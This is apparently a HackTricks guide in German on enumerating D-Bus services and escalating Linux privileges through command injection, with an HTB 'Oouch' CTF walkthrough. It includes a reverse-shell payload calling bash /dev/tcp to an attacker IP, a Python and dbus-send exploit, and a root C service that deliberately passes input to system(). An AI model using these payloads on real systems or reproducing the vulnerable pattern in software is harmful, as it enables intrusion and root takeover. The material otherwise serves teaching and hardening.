# D-Bus Enumeration und Command Injection zur Privilege Escalation

## **GUI enumeration**

D-Bus wird in Ubuntu-Desktop-Umgebungen als Vermittler für die Interprozesskommunikation (IPC) eingesetzt. Unter Ubuntu wird der gleichzeitige Betrieb mehrerer Message Bus beobachtet: der System Bus, der hauptsächlich von **privileged services verwendet wird, um systemweit relevante Services bereitzustellen**, sowie ein Session Bus für jeden angemeldeten Benutzer, der nur für diesen Benutzer relevante Services bereitstellt. Der Fokus liegt hier hauptsächlich auf dem System Bus, da er mit Services verbunden ist, die mit höheren Privilegien (z. B. als root) ausgeführt werden, da unser Ziel die Privilege Escalation ist. Es wird darauf hingewiesen, dass die Architektur von D-Bus pro Session Bus einen „Router“ verwendet, der dafür zuständig ist, Client-Nachrichten anhand der von den Clients angegebenen Adresse an die entsprechenden Services weiterzuleiten, mit denen sie kommunizieren möchten.<sup>[[1]](#references)</sup>

Services auf D-Bus werden durch die **objects** und **interfaces** definiert, die sie bereitstellen. Objects können mit Klasseninstanzen in gewöhnlichen OOP-Sprachen verglichen werden, wobei jede Instanz eindeutig durch einen **object path** identifiziert wird. Dieser Pfad identifiziert, ähnlich wie ein Dateisystempfad, jedes vom Service bereitgestellte Object eindeutig. Ein für die Recherche wichtiges Interface ist das **org.freedesktop.DBus.Introspectable**-Interface mit einer einzigen Methode namens Introspect. Diese Methode gibt eine XML-Darstellung der vom Object unterstützten Methoden, Signale und Properties zurück; hier liegt der Fokus auf den Methoden, während Properties und Signale ausgelassen werden.

Für die Kommunikation mit dem D-Bus-Interface wurden zwei Tools verwendet: ein CLI-Tool namens **gdbus** zum einfachen Aufrufen von durch D-Bus bereitgestellten Methoden in Scripts sowie [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), ein Python-basiertes GUI-Tool, das dafür entwickelt wurde, die auf jedem Bus verfügbaren Services zu enumerieren und die in jedem Service enthaltenen Objects anzuzeigen.
```bash
sudo apt-get install d-feet
```
Wenn du den **session bus** überprüfst, bestätige zuerst die aktuelle Adresse:
```bash
echo "$DBUS_SESSION_BUS_ADDRESS"
```
![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)

![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)

Im ersten Bild werden die beim D-Bus-Systembus registrierten Services angezeigt, wobei **org.debin.apt** nach der Auswahl der Schaltfläche „System Bus“ besonders hervorgehoben ist. D-Feet fragt diesen Service nach Objekten ab und zeigt für ausgewählte Objekte Interfaces, Methoden, Properties und Signale an, wie im zweiten Bild zu sehen ist. Die Signatur jeder Methode wird ebenfalls detailliert dargestellt.

Eine bemerkenswerte Funktion ist die Anzeige der **process ID (pid)** und der **command line** des Services. Dies ist nützlich, um zu überprüfen, ob der Service mit erhöhten Privilegien ausgeführt wird, was für die Relevanz der Untersuchung wichtig ist.

**D-Feet ermöglicht auch den Aufruf von Methoden**: Benutzer können Python-Ausdrücke als Parameter eingeben, die D-Feet vor der Übergabe an den Service in D-Bus-Typen umwandelt.

Beachtet jedoch, dass **einige Methoden eine Authentifizierung erfordern**, bevor wir sie aufrufen können. Wir ignorieren diese Methoden, da unser Ziel von vornherein darin besteht, unsere Privilegien ohne Credentials zu erhöhen.

Beachtet außerdem, dass einige Services einen anderen D-Bus-Service namens org.freedeskto.PolicyKit1 abfragen, ob ein Benutzer bestimmte Aktionen ausführen darf oder nicht.

## **Enumeration der Cmd line**

### Service-Objekte auflisten

Es ist möglich, geöffnete D-Bus-Interfaces mit folgendem Befehl aufzulisten:
```bash
busctl list #List D-Bus interfaces

NAME                                   PID PROCESS         USER             CONNECTION    UNIT                      SE
:1.0                                     1 systemd         root             :1.0          init.scope                -
:1.1345                              12817 busctl          qtc              :1.1345       session-729.scope         72
:1.2                                  1576 systemd-timesyn systemd-timesync :1.2          systemd-timesyncd.service -
:1.3                                  2609 dbus-server     root             :1.3          dbus-server.service       -
:1.4                                  2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
:1.6                                  2612 systemd-logind  root             :1.6          systemd-logind.service    -
:1.8                                  3087 unattended-upgr root             :1.8          unattended-upgrades.serv… -
:1.820                                6583 systemd         qtc              :1.820        user@1000.service         -
com.ubuntu.SoftwareProperties            - -               -                (activatable) -                         -
fi.epitest.hostap.WPASupplicant       2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
fi.w1.wpa_supplicant1                 2606 wpa_supplicant  root             :1.4          wpa_supplicant.service    -
htb.oouch.Block                       2609 dbus-server     root             :1.3          dbus-server.service       -
org.bluez                                - -               -                (activatable) -                         -
org.freedesktop.DBus                     1 systemd         root             -             init.scope                -
org.freedesktop.PackageKit               - -               -                (activatable) -                         -
org.freedesktop.PolicyKit1               - -               -                (activatable) -                         -
org.freedesktop.hostname1                - -               -                (activatable) -                         -
org.freedesktop.locale1                  - -               -                (activatable) -                         -
```
Dienste mit der Markierung **`(activatable)`** sind besonders interessant, da sie **noch nicht ausgeführt werden**, aber eine Bus-Anfrage sie bei Bedarf starten kann. Beschränke dich nicht auf `busctl list`; ordne diese Namen den tatsächlichen Binaries zu, die sie ausführen würden.
```bash
ls -la /usr/share/dbus-1/system-services/ /usr/share/dbus-1/services/ 2>/dev/null
grep -RInE '^(Name|Exec|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
```
Das zeigt Ihnen schnell, welcher `Exec=`-Pfad für einen aktivierbaren Namen gestartet wird und unter welcher Identität. Wenn die Binärdatei oder ihre Ausführungskette nur unzureichend geschützt ist, kann ein inaktiver Service dennoch zu einem Pfad für Privilege Escalation werden.

#### Verbindungen

[Aus Wikipedia:](https://en.wikipedia.org/wiki/D-Bus) Wenn ein Prozess eine Verbindung zu einem Bus herstellt, weist der Bus der Verbindung einen speziellen Busnamen zu, der _unique connection name_ genannt wird. Busnamen dieses Typs sind unveränderlich – es ist garantiert, dass sie sich nicht ändern, solange die Verbindung besteht – und, noch wichtiger, sie können während der Lebensdauer des Busses nicht wiederverwendet werden. Das bedeutet, dass keine andere Verbindung zu diesem Bus jemals denselben unique connection name zugewiesen bekommt, selbst wenn derselbe Prozess die Verbindung zum Bus schließt und eine neue erstellt. Unique connection names sind leicht zu erkennen, da sie mit dem ansonsten verbotenen Doppelpunktzeichen beginnen.<sup>[[4]](#references)</sup>

### Informationen zum Service-Objekt

Anschließend können Sie mit Folgendem einige Informationen über das Interface abrufen:
```bash
busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface

PID=2609
PPID=1
TTY=n/a
UID=0
EUID=0
SUID=0
FSUID=0
GID=0
EGID=0
SGID=0
FSGID=0
SupplementaryGIDs=
Comm=dbus-server
CommandLine=/root/dbus-server
Label=unconfined
CGroup=/system.slice/dbus-server.service
Unit=dbus-server.service
Slice=system.slice
UserUnit=n/a
UserSlice=n/a
Session=n/a
AuditLoginUID=n/a
AuditSessionID=n/a
UniqueName=:1.3
EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
InheritableCapabilities=
BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
cap_fowner cap_fsetid cap_kill cap_setgid
cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
cap_mknod cap_lease cap_audit_write cap_audit_control
cap_setfcap cap_mac_override cap_mac_admin cap_syslog
cap_wake_alarm cap_block_suspend cap_audit_read
```
Korrelieren Sie außerdem den Busnamen mit seiner `systemd`-Einheit und dem Pfad zur ausführbaren Datei:
```bash
systemctl status dbus-server.service --no-pager
systemctl cat dbus-server.service
namei -l /root/dbus-server
```
Dies beantwortet die operative Frage, die während der privesc wichtig ist: **Welche reale Binary und welche Unit führen die Aktion aus, wenn ein Methodenaufruf erfolgreich ist?**

### Interfaces eines Service-Objekts auflisten

Du benötigst ausreichende Berechtigungen.
```bash
busctl tree htb.oouch.Block #Get Interfaces of the service object

└─/htb
└─/htb/oouch
└─/htb/oouch/Block
```
### Introspect-Schnittstelle eines Service-Objekts

Beachte, dass in diesem Beispiel die zuletzt mit dem Parameter `tree` ermittelte Schnittstelle ausgewählt wurde (_siehe vorherigen Abschnitt_):
```bash
busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface

NAME                                TYPE      SIGNATURE RESULT/VALUE FLAGS
htb.oouch.Block                     interface -         -            -
.Block                              method    s         s            -
org.freedesktop.DBus.Introspectable interface -         -            -
.Introspect                         method    -         s            -
org.freedesktop.DBus.Peer           interface -         -            -
.GetMachineId                       method    -         s            -
.Ping                               method    -         -            -
org.freedesktop.DBus.Properties     interface -         -            -
.Get                                method    ss        v            -
.GetAll                             method    s         a{sv}        -
.Set                                method    ssv       -            -
.PropertiesChanged                  signal    sa{sv}as  -            -
```
Beachte die Methode `.Block` des Interfaces `htb.oouch.Block` (an der wir interessiert sind). Das „s“ der anderen Spalten könnte bedeuten, dass ein string erwartet wird.

Bevor du etwas Gefährliches ausprobierst, validiere zunächst eine **read-oriented** oder anderweitig risikoarme Methode. Dadurch lassen sich drei Fälle klar unterscheiden: falsche Syntax, erreichbar, aber verweigert, oder erreichbar und erlaubt.
```bash
busctl call org.freedesktop.login1 /org/freedesktop/login1 org.freedesktop.login1.Manager CanReboot
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot
```
### D-Bus-Methoden mit Policies und Aktionen korrelieren

Die Introspection zeigt dir, **was** du aufrufen kannst, aber nicht, **warum** ein Aufruf erlaubt oder verweigert wird. Für ein echtes privesc-Triage musst du normalerweise **drei Ebenen gemeinsam** untersuchen:

1. **Aktivierungsmetadaten** (`.service`-Dateien oder `SystemdService=`), um herauszufinden, welche Binary und welche Unit tatsächlich ausgeführt werden.
2. **D-Bus-XML-Policy** (`/etc/dbus-1/system.d/`, `/usr/share/dbus-1/system.d/`), um herauszufinden, wer `own`, `send_destination` oder `receive_sender` verwenden darf.
3. **Polkit-Aktionsdateien** (`/usr/share/polkit-1/actions/*.policy`), um das standardmäßige Autorisierungsmodell zu verstehen (`allow_active`, `allow_inactive`, `auth_admin`, `auth_self`, `org.freedesktop.policykit.imply`).

Nützliche Befehle:
```bash
grep -RInE '^(Name|Exec|SystemdService|User)=' /usr/share/dbus-1/system-services /usr/share/dbus-1/services 2>/dev/null
grep -RInE '<(allow|deny) (own|send_destination|receive_sender)=|user=|group=' /etc/dbus-1/system.d /usr/share/dbus-1/system.d /etc/dbus-1/system-local.d 2>/dev/null
grep -RInE 'allow_active|allow_inactive|auth_admin|auth_self|org\.freedesktop\.policykit\.imply' /usr/share/polkit-1/actions 2>/dev/null
pkaction --verbose
```
Nimm **keine 1:1-Zuordnung zwischen einer D-Bus-Methode und einer Polkit-Aktion** an. Dieselbe Methode kann abhängig vom zu ändernden Objekt oder vom Laufzeitkontext eine andere Aktion auswählen. Der praktische Workflow ist daher:

1. `busctl introspect` / `gdbus introspect`
2. `pkaction --verbose` und die relevanten `.policy`-Dateien mit grep durchsuchen
3. risikoarme Live-Sonden mit `busctl call`, `gdbus call` oder `dbusmap --enable-probes --null-agent`

Proxy- oder Kompatibilitätsdienste verdienen besondere Aufmerksamkeit. Ein **als root laufender Proxy**, der Anfragen über seine eigene, zuvor aufgebaute Verbindung an einen anderen D-Bus-Dienst weiterleitet, kann dazu führen, dass der Backend-Dienst jede Anfrage fälschlicherweise als von UID 0 stammend behandelt, sofern die Identität des ursprünglichen Aufrufers nicht erneut überprüft wird.<sup>[[3]](#references)</sup>

### Monitor-/Capture-Schnittstelle

Mit ausreichenden Privilegien (nur `send_destination`- und `receive_sender`-Privilegien reichen nicht aus) kannst du eine **D-Bus-Kommunikation überwachen**.

Um eine **Kommunikation zu überwachen**, musst du **root** sein. Wenn du als root weiterhin Probleme feststellst, prüfe [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) und [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)

> [!WARNING]
> Wenn du weißt, wie man eine D-Bus-Konfigurationsdatei so einrichtet, dass **Nicht-root-Benutzer die Kommunikation sniffen können**, **kontaktiere mich bitte**!

Verschiedene Möglichkeiten zur Überwachung:
```bash
sudo busctl monitor htb.oouch.Block #Monitor only specified
sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
```
Im folgenden Beispiel wird die Schnittstelle `htb.oouch.Block` überwacht und **die Nachricht "**_**lalalalal**_**" wird durch eine Fehlkommunikation gesendet**:
```bash
busctl monitor htb.oouch.Block

Monitoring bus message stream.
‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
UniqueName=:1.1376
MESSAGE "s" {
STRING "lalalalal";
};

‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
Sender=:1.3  Destination=:1.1376
UniqueName=:1.3
MESSAGE "s" {
STRING "Carried out :D";
};
```
Du kannst `capture` anstelle von `monitor` verwenden, um die Ergebnisse in einer **pcapng**-Datei zu speichern, die Wireshark öffnen kann:
```bash
sudo busctl capture htb.oouch.Block > dbus-htb.oouch.Block.pcapng
sudo busctl capture > system-bus.pcapng
```
#### Herausfiltern des gesamten Rauschens <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>

Wenn sich zu viele Informationen auf dem Bus befinden, übergib eine Match-Regel wie diese:
```bash
dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
```
Es können mehrere Regeln angegeben werden. Wenn eine Nachricht _einer_ der Regeln entspricht, wird die Nachricht ausgegeben. Zum Beispiel:
```bash
dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
```

```bash
dbus-monitor "type=method_call" "type=method_return" "type=error"
```
See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) for more information on match rule syntax.<sup>[[7]](#references)</sup>

### More

`busctl` has even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).

## **Vulnerable Scenario**

As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-Bus config file** located in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
```xml
<?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->

<!DOCTYPE busconfig PUBLIC
"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">

<busconfig>

<policy user="root">
<allow own="htb.oouch.Block"/>
</policy>

<policy user="www-data">
<allow send_destination="htb.oouch.Block"/>
<allow receive_sender="htb.oouch.Block"/>
</policy>

</busconfig>
```
Aus der vorherigen Konfiguration geht hervor, dass Sie der Benutzer `root` oder `www-data` sein müssen, um Informationen über diese D-BUS-Kommunikation zu senden und zu empfangen.

Als Benutzer **qtc** innerhalb des Docker-Containers **aeb4525789d8** finden Sie in der Datei _/code/oouch/routes.py_ etwas dbus-bezogenen Code. Dies ist der relevante Code:
```python
if primitive_xss.search(form.textfield.data):
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')

client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
response = block_iface.Block(client_ip)
bus.close()
return render_template('hacker.html', title='Hacker')
```
Wie Sie sehen können, **verbindet es sich mit einem D-Bus interface** und sendet die „client_ip“ an die **„Block“-Funktion**.

Auf der anderen Seite der D-Bus-Verbindung läuft ein kompiliertes C-Binary. Dieser Code **lauscht** in der D-Bus-Verbindung **auf eine IP-Adresse und ruft iptables über die `system`-Funktion auf**, um die angegebene IP-Adresse zu blockieren.\
Der Aufruf von `system` ist absichtlich **anfällig für command injection**, sodass ein Payload wie der folgende eine reverse shell erstellt: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`

### Exploit it

Am Ende dieser Seite finden Sie den **vollständigen C-Code der D-Bus-Anwendung**. Darin können Sie zwischen den Zeilen 91–97 sehen, **wie der `D-Bus object path`** **und der `interface name`** **registriert werden**. Diese Informationen werden benötigt, um Informationen an die D-Bus-Verbindung zu senden:
```c
/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
```
Außerdem ist in Zeile 57 zu sehen, dass die **einzige registrierte Methode** für diese D-Bus-Kommunikation `Block` heißt(_**Deshalb werden die Payloads im folgenden Abschnitt an das Service-Objekt `htb.oouch.Block`, das Interface `/htb/oouch/Block` und den Methodennamen `Block` gesendet**_):
```c
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
```
#### Python

Der folgende Python-Code sendet den Payload über `block_iface.Block(runme)` an die D-Bus-Verbindung zur `Block`-Methode (_beachte, dass er aus dem vorherigen Codeabschnitt extrahiert wurde_):
```python
import dbus
bus = dbus.SystemBus()
block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
response = block_iface.Block(runme)
bus.close()
```
#### busctl and dbus-send
```bash
dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
```
- `dbus-send` ist ein Tool zum Senden von Nachrichten an den „Message Bus“.
- Message Bus – Eine von Systemen verwendete Software, um die Kommunikation zwischen Anwendungen zu erleichtern. Sie ist mit Message Queue verwandt (Nachrichten werden sequenziell geordnet), aber im Message Bus werden die Nachrichten in einem Subscription-Modell und zudem sehr schnell gesendet.
- Das Tag „-system“ wird verwendet, um anzugeben, dass es sich um eine Systemnachricht und nicht standardmäßig um eine Session-Nachricht handelt.
- Das Tag „–print-reply“ wird verwendet, um unsere Nachricht ordnungsgemäß auszugeben und Antworten in einem für Menschen lesbaren Format zu empfangen.
- „–dest=Dbus-Interface-Block“ – Die Adresse des Dbus-Interface.
- „–string:“ – Der Nachrichtentyp, den wir an das Interface senden möchten. Es gibt mehrere Formate zum Senden von Nachrichten, z. B. double, bytes, booleans, int und objpath. Davon ist der „object path“ nützlich, wenn wir einen Dateipfad an das Dbus-Interface senden möchten. In diesem Fall können wir eine spezielle Datei (FIFO) verwenden, um einen Befehl im Namen einer Datei an das Interface zu übergeben. „string:;“ – Dies dient dazu, den object path erneut aufzurufen, an dem wir die FIFO reverse shell-Datei bzw. den Befehl platzieren.

_Beachte, dass in `htb.oouch.Block.Block` der erste Teil (`htb.oouch.Block`) auf das service object und der letzte Teil (`.Block`) auf den Methodennamen verweist._

### C code
```c:d-bus_server.c
//sudo apt install pkgconf
//sudo apt install libsystemd-dev
//gcc d-bus_server.c -o dbus_server `pkg-config --cflags --libs libsystemd`

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <systemd/sd-bus.h>

static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
char* host = NULL;
int r;

/* Read the parameters */
r = sd_bus_message_read(m, "s", &host);
if (r < 0) {
fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
return r;
}

char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";

int command_len = strlen(command);
int host_len = strlen(host);

char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
if(command_buffer == NULL) {
fprintf(stderr, "Failed to allocate memory\n");
return -1;
}

sprintf(command_buffer, command, host);

/* In the first implementation, we simply ran command using system(), since the expected DBus
* to be threading automatically. However, DBus does not thread and the application will hang
* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
* multithreading)
*/
int pid = fork();

if ( pid == 0 ) {
/* Here we are in the child process. We execute the command and eventually exit. */
system(command_buffer);
exit(0);
} else {
/* Here we are in the parent process or an error occured. We simply send a genric message.
* In the first implementation we returned separate error messages for success or failure.
* However, now we cannot wait for results of the system call. Therefore we simply return
* a generic. */
return sd_bus_reply_method_return(m, "s", "Carried out :D");
}
r = system(command_buffer);
}


/* The vtable of our little object, implements the net.poettering.Calculator interface */
static const sd_bus_vtable block_vtable[] = {
SD_BUS_VTABLE_START(0),
SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
SD_BUS_VTABLE_END
};


int main(int argc, char *argv[]) {
/*
* Main method, registeres the htb.oouch.Block service on the system dbus.
*
* Paramaters:
*      argc            (int)             Number of arguments, not required
*      argv[]          (char**)          Argument array, not required
*
* Returns:
*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
*      as long as the user keeps it alive.
*/


/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
signal(SIGCHLD,SIG_IGN);

sd_bus_slot *slot = NULL;
sd_bus *bus = NULL;
int r;

/* First we need to connect to the system bus. */
r = sd_bus_open_system(&bus);
if (r < 0)
{
fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
goto finish;
}

/* Install the object */
r = sd_bus_add_object_vtable(bus,
&slot,
"/htb/oouch/Block",  /* interface */
"htb.oouch.Block",   /* service object */
block_vtable,
NULL);
if (r < 0) {
fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
goto finish;
}

/* Register the service name to find out object */
r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
if (r < 0) {
fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
goto finish;
}

/* Infinite loop to process the client requests */
for (;;) {
/* Process requests */
r = sd_bus_process(bus, NULL);
if (r < 0) {
fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
goto finish;
}
if (r > 0) /* we processed a request, try to process another one, right-away */
continue;

/* Wait for the next request to process */
r = sd_bus_wait(bus, (uint64_t) -1);
if (r < 0) {
fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
goto finish;
}
}

finish:
sd_bus_slot_unref(slot);
sd_bus_unref(bus);

return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
}
```
## Automatisierte Enumeration-Hilfsprogramme (2023–2025)

Die manuelle Enumeration einer großen D-Bus-Angriffsfläche mit `busctl`/`gdbus` wird schnell mühsam. Zwei kleine FOSS-Hilfsprogramme, die in den letzten Jahren veröffentlicht wurden, können bei Red-Team- oder CTF-Einsätzen für mehr Geschwindigkeit sorgen:

### dbusmap („Nmap for D-Bus“)
* Autor: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)<sup>[[5]](#references)</sup>
* In C geschrieben; einzelnes statisches Binary (<50 kB), das jeden Object Path durchläuft, die `Introspect`-XML abruft und sie dem zuständigen PID/UID zuordnet.<sup>[[5]](#references)</sup>
* Nützliche Flags:
```bash
# List every service on the *system* bus and dump all callable methods
sudo dbus-map --dump-methods

# Actively probe methods/properties you can reach without Polkit prompts
sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
```
* Das Tool markiert ungeschützte Well-known Names mit `!` und zeigt dadurch sofort Services, die du *übernehmen* (take over) kannst, oder Methodenaufrufe, die aus einer nicht privilegierten Shell erreichbar sind.

### uptux.py
* Autor: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)<sup>[[6]](#references)</sup>
* Python-only-Script, das nach *beschreibbaren* Pfaden in systemd-Units **und** übermäßig freizügigen D-Bus-Policy-Dateien sucht (z. B. `send_destination="*"`).<sup>[[6]](#references)</sup>
* Schnelle Verwendung:
```bash
python3 uptux.py -n          # run all checks but don’t write a log file
python3 uptux.py -d          # enable verbose debug output
```
* Das D-Bus-Modul durchsucht die folgenden Verzeichnisse und hebt jeden Service hervor, der von einem normalen Benutzer gefälscht oder hijacked werden kann:
* `/etc/dbus-1/system.d/` und `/usr/share/dbus-1/system.d/`
* `/etc/dbus-1/system-local.d/` (Hersteller-Overrides)

---

## Bemerkenswerte D-Bus-Privilege-Escalation-Bugs (2024–2025)

Ein Blick auf kürzlich veröffentlichte CVEs hilft dabei, ähnliche unsichere Muster in benutzerdefiniertem Code zu erkennen. Zwei gute aktuelle Beispiele sind:<sup>[[2]](#references)[[3]](#references)</sup>

| Jahr | CVE | Komponente | Grundursache | Offensive Erkenntnis |
|------|-----|-----------|------------|------------------|
| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (`logid`) | Der als root laufende Service stellte eine D-Bus-Schnittstelle bereit, die nicht privilegierte Benutzer umkonfigurieren konnten, einschließlich des Ladens von angreifergesteuertem Makroverhalten. | Wenn ein Daemon **Geräte-/Profil-/Konfigurationsverwaltung** über den system bus bereitstellt, behandle beschreibbare Konfigurationen und Makrofunktionen als Primitive für Codeausführung, nicht nur als „Einstellungen“. |
| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.19 | Ein als root laufender Kompatibilitäts-Proxy leitete Anfragen an Backend-Services weiter, ohne den Sicherheitskontext des ursprünglichen Aufrufers beizubehalten. Dadurch vertrauten die Backends dem Proxy als UID 0. | Behandle **Proxy-/Bridge-/Kompatibilitäts**-D-Bus-Services als separate Bug-Klasse: Wenn sie privilegierte Aufrufe weiterleiten, prüfe, wie die UID bzw. der Polkit-Kontext des Aufrufers das Backend erreicht. |

Zu beachtende Muster:
1. Der Service läuft **als root auf dem system bus**.
2. Entweder gibt es **keine Autorisierungsprüfung**, oder die Prüfung erfolgt anhand des **falschen Subjekts**.
3. Die erreichbare Methode ändert letztendlich den Systemzustand: Paketinstallation, Benutzer-/Gruppenänderungen, Bootloader-Konfiguration, Aktualisierung von Geräteprofilen, Dateischreibvorgänge oder direkte Befehlsausführung.

Verwende `dbusmap --enable-probes` oder manuell `busctl call`, um zu bestätigen, ob eine Methode erreichbar ist. Untersuche anschließend die Policy-XML des Services und die Polkit-Aktionen, um zu verstehen, **welches Subjekt** tatsächlich autorisiert wird.

---

## Schnelle Maßnahmen zur Härtung und Erkennung

* Suche nach für alle beschreibbaren oder für *send/receive* offenen Policies:
```bash
grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
```
* Verlange Polkit für gefährliche Methoden – selbst *root*-Proxies sollten die PID des *Aufrufers* an `polkit_authority_check_authorization_sync()` übergeben, statt ihre eigene.
* Entziehe langlebigen Hilfsprogrammen Privilegien (verwende `sd_pid_get_owner_uid()`, um nach der Verbindung zum Bus Namespaces zu wechseln).
* Wenn du einen Service nicht entfernen kannst, beschränke ihn zumindest auf eine dedizierte Unix-Gruppe und schränke den Zugriff in seiner XML-Policy ein.
* Blue-Team: Erfasse den system bus mit `busctl capture > /var/log/dbus_$(date +%F).pcapng` und importiere ihn zur Anomalieerkennung in Wireshark.

---

## References

- [1] [USBCreator D-Bus-Privilege-Escalation im Ubuntu Desktop](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
- [2] [CVE-2024-45752: D-Bus-Service ermöglicht Konfiguration durch jeden nicht privilegierten Benutzer](https://github.com/PixlOne/logiops/issues/473)
- [3] [dde-api-proxy: Authentifizierungsumgehung im Deepin-D-Bus-Proxy-Service (CVE-2025-23222)](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
- [4] [D-Bus – Wikipedia](https://en.wikipedia.org/wiki/D-Bus)
- [5] [taviso/dbusmap – „Nmap for D-Bus“](https://github.com/taviso/dbusmap)
- [6] [initstring/uptux](https://github.com/initstring/uptux)
- [7] [dbus.freedesktop.org – D-Bus-Dokumentation](http://dbus.freedesktop.org/doc/dbus-specification.html)
{{#include ../../banners/hacktricks-training.md}}
